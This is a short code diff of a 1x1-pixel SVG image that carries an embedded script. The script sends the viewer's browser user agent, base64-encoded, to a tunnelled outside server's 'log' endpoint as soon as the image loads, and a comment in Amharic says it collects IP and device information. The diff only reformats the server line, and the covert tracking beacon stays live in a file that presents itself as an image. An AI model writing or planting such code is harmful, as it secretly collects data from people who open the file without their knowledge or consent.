@@ -1,8 +1,9 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
   <script>
     // <![CDATA[
-    try {
-        my_server = "https://5982609c16f0d443-196-191-121-23.serveousercontent.com";
+    try {my_server = "https://5982609c16f0d443-196-191-121-23.serveousercontent.com/";
+
+        
 
         // 1. መሰረታዊ መረጃ መላክ (IP & Device Info)
         fetch(my_server + "log?info=" + btoa(navigator.userAgent));
